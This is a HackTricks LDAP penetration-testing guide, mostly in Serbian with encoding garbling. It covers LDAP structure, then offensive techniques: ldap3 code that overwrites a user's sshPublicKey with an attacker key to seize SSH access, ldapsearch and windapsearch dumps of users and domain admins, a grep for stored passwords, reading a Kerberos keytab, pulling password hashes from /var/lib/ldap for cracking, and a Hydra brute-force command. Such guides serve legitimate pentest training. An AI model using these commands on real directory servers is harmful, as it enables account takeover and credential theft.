# 389, 636, 3268, 3269 - Pentesting LDAP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Kori≈°ƒáenje **LDAP** (Protokol za pristup lakim direktorijumima) je prvenstveno za lociranje raznih entiteta kao ≈°to su organizacije, pojedinci i resursi poput fajlova i ureƒëaja unutar mre≈æa, kako javnih tako i privatnih. Pru≈æa pojednostavljen pristup u poreƒëenju sa svojim prethodnikom, DAP, imajuƒái manji kod.

LDAP direktorijumi su strukturirani tako da omoguƒáavaju njihovu distribuciju preko vi≈°e servera, pri ƒçemu svaki server sadr≈æi **repliciranu** i **sinkronizovanu** verziju direktorijuma, koja se naziva Agenta sistema direktorijuma (DSA). Odgovornost za obradu zahteva le≈æi iskljuƒçivo na LDAP serveru, koji mo≈æe komunicirati sa drugim DSA-ima po potrebi kako bi isporuƒçio jedinstven odgovor tra≈æiocu.

Organizacija LDAP direktorijuma podseƒáa na **stablo hijerarhije, poƒçinjuƒái od korenskog direktorijuma na vrhu**. Ovo se grana na zemlje, koje se dalje dele na organizacije, a zatim na organizacione jedinice koje predstavljaju razliƒçite divizije ili odeljenja, konaƒçno dosti≈æuƒái nivo pojedinaƒçnih entiteta, ukljuƒçujuƒái i ljude i deljene resurse poput fajlova i ≈°tampaƒça.

**Podrazumevani port:** 389 i 636(ldaps). Globalni katalog (LDAP u ActiveDirectory) je dostupan po defaultu na portovima 3268 i 3269 za LDAPS.
```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```
### LDAP Data Interchange Format

LDIF (LDAP Data Interchange Format) defini≈°e sadr≈æaj direktorijuma kao skup zapisa. Takoƒëe mo≈æe predstavljati zahteve za a≈æuriranje (Dodaj, Izmeni, Obri≈°i, Preimenuj).
```bash
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```
* Linije 1-3 defini≈°u najvi≈°i nivo domena local
* Linije 5-8 defini≈°u prvi nivo domena moneycorp (moneycorp.local)
* Linije 10-16 defini≈°u 2 organizacione jedinice: dev i sales
* Linije 18-26 kreiraju objekat domena i dodeljuju atribute sa vrednostima

## Write data

Imajte na umu da ako mo≈æete da modifikujete vrednosti, mogli biste biti u moguƒánosti da izvr≈°ite zaista zanimljive akcije. Na primer, zamislite da **mo≈æete promeniti informacije o "sshPublicKey"** va≈°eg korisnika ili bilo kog korisnika. Veoma je verovatno da ako ovaj atribut postoji, onda **ssh ƒçita javne kljuƒçeve iz LDAP-a**. Ako mo≈æete da modifikujete javni kljuƒç korisnika, **moƒái ƒáete da se prijavite kao taj korisnik ƒçak i ako autentifikacija lozinkom nije omoguƒáena u ssh**.
```bash
# Example from https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```
## Sniff clear text credentials

Ako se LDAP koristi bez SSL-a, mo≈æete **snimiti kredencijale u obiƒçnom tekstu** u mre≈æi.

Takoƒëe, mo≈æete izvr≈°iti **MITM** napad u mre≈æi **izmeƒëu LDAP servera i klijenta.** Ovde mo≈æete napraviti **Downgrade Attack** tako da klijent koristi **kredencijale u obiƒçnom tekstu** za prijavu.

**Ako se koristi SSL** mo≈æete poku≈°ati da napravite **MITM** kao ≈°to je pomenuto iznad, ali nudeƒái **la≈æni sertifikat**, ako **korisnik to prihvati**, mo≈æete smanjiti metodu autentifikacije i ponovo videti kredencijale.

## Anonymous Access

### Bypass TLS SNI check

Prema [**ovoj analizi**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) samo pristupanjem LDAP serveru sa proizvoljnim imenom domena (kao ≈°to je company.com) mogao je da kontaktira LDAP servis i izvuƒçe informacije kao anonimni korisnik:
```bash
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
### LDAP anonimni vezovi

[LDAP anonimni vezovi](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) omoguƒáavaju **neautentifikovanim napadaƒçima** da preuzmu informacije iz domena, kao ≈°to su potpuni spisak korisnika, grupa, raƒçunara, atributa korisniƒçkih naloga i politike lozinki domena. Ovo je **nasleƒëena konfiguracija**, i od Windows Server 2003, samo autentifikovani korisnici su ovla≈°ƒáeni da pokreƒáu LDAP zahteve.\
Meƒëutim, administratori su mo≈æda morali da **konfiguri≈°u odreƒëenu aplikaciju da dozvoli anonimne vezove** i dali vi≈°e pristupa nego ≈°to je bilo predviƒëeno, ƒçime su neautentifikovanim korisnicima omoguƒáili pristup svim objektima u AD.

## Validne kredencijale

Ako imate validne kredencijale za prijavu na LDAP server, mo≈æete izvuƒái sve informacije o Domenskom Administratoru koristeƒái:

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```
### [Brute Force](../generic-methodologies-and-resources/brute-force.md#ldap)

## Enumeration

### Automated

Kori≈°ƒáenjem ovoga biƒáete u moguƒánosti da vidite **javne informacije** (kao ≈°to je naziv domena)**:**
```bash
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
### Python

<details>

<summary>See LDAP enumeration with python</summary>

Mo≈æete poku≈°ati da **enumerate LDAP sa ili bez kredencijala koristeƒái python**: `pip3 install ldap3`

Prvo poku≈°ajte da **se pove≈æete bez** kredencijala:
```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```
–ê–∫–æ —ò–µ –æ–¥–≥–æ–≤–æ—Ä `True`, –∫–∞–æ —É –ø—Ä–µ—Ç—Ö–æ–¥–Ω–æ–º –ø—Ä–∏–º–µ—Ä—É, –º–æ–∂–µ—Ç–µ –¥–æ–±–∏—Ç–∏ –Ω–µ–∫–µ **–∑–∞–Ω–∏–º—ô–∏–≤–µ –ø–æ–¥–∞—Ç–∫–µ** —Å–∞ LDAP-–∞ (–∫–∞–æ —à—Ç–æ —Å—É **–∏–º–µ–Ω—Å–∫–∏ –∫–æ–Ω—Ç–µ–∫—Å—Ç** –∏–ª–∏ **–¥–æ–º–µ–Ω—Å–∫–æ –∏–º–µ**) —Å–µ—Ä–≤–µ—Ä–∞ —Å–∞:
```bash
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
```
Kada imate kontekst imenovanja, mo≈æete postaviti jo≈° uzbudljivije upite. Ovaj jednostavni upit bi trebao da vam prika≈æe sve objekte u direktorijumu:
```bash
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```
–ò–ª–∏ **dump** —Ü–µ–ª–æ–≥ ldap:
```bash
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```
</details>

### windapsearch

[**Windapsearch**](https://github.com/ropnop/windapsearch) je Python skripta koja je korisna za **enumeraciju korisnika, grupa i raƒçunara iz Windows** domena koristeƒái LDAP upite.
```bash
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### ldapsearch

Proverite null kredencijale ili da li su va≈°i kredencijali validni:
```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
```
Ako pronaƒëete ne≈°to ≈°to ka≈æe da "_bind mora biti zavr≈°en_" to znaƒçi da su akreditivi netaƒçni.

Mo≈æete izvuƒái **sve iz domena** koristeƒái:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
Izvuci **korisnike**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```
Izvuci **raƒçunare**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Izvuci **moje informacije**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Izvuci **Domain Admins**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Izvuci **Domain Users**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Izvuci **Enterprise Admins**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Izvuci **Administratore**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Izvuci **Remote Desktop Group**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Da biste proverili da li imate pristup bilo kojoj lozinki, mo≈æete koristiti grep nakon izvr≈°avanja jednog od upita:
```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```
Molimo vas, imajte na umu da lozinke koje ovde mo≈æete pronaƒái mo≈æda nisu prave...

#### pbis

Mo≈æete preuzeti **pbis** odavde: [https://github.com/BeyondTrust/pbis-open/](https://github.com/BeyondTrust/pbis-open/) i obiƒçno se instalira u `/opt/pbis`.\
**Pbis** vam omoguƒáava da lako dobijete osnovne informacije:
```bash
#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
```
## Grafiƒçki Interfejs

### Apache Directory

[**Preuzmite Apache Directory odavde**](https://directory.apache.org/studio/download/download-linux.html). Mo≈æete pronaƒái [primer kako koristiti ovaj alat ovde](https://www.youtube.com/watch?v=VofMBg2VLnw\&t=3840s).

### jxplorer

Mo≈æete preuzeti grafiƒçki interfejs sa LDAP serverom ovde: [http://www.jxplorer.org/downloads/users.html](http://www.jxplorer.org/downloads/users.html)

Podrazumevano je instaliran u: _/opt/jxplorer_

![](<../.gitbook/assets/image (482).png>)

### Godap

Mo≈æete mu pristupiti na [https://github.com/Macmod/godap](https://github.com/Macmod/godap)

## Autentifikacija putem kerberos-a

Kori≈°ƒáenjem `ldapsearch` mo≈æete **autentifikovati** se protiv **kerberos-a umesto** putem **NTLM** koristeƒái parametar `-Y GSSAPI`

## POST

Ako mo≈æete pristupiti datotekama gde su sadr≈æane baze podataka (mogu biti u _/var/lib/ldap_). Mo≈æete izvuƒái he≈°ove koristeƒái:
```bash
cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
```
Mo≈æete nahraniti johna sa he≈°om lozinke (od '{SSHA}' do 'structural' bez dodavanja 'structural').

### Konfiguracione datoteke

* General
* containers.ldif
* ldap.cfg
* ldap.conf
* ldap.xml
* ldap-config.xml
* ldap-realm.xml
* slapd.conf
* IBM SecureWay V3 server
* V3.sas.oc
* Microsoft Active Directory server
* msadClassesAttrs.ldif
* Netscape Directory Server 4
* nsslapd.sas\_at.conf
* nsslapd.sas\_oc.conf
* OpenLDAP directory server
* slapd.sas\_at.conf
* slapd.sas\_oc.conf
* Sun ONE Directory Server 5.1
* 75sas.ldif

## HackTricks Automatske Komande
```
Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
The use of LDAP (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
```
{% hint style="success" %}
Uƒçite i ve≈æbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Uƒçite i ve≈æbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr≈æite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
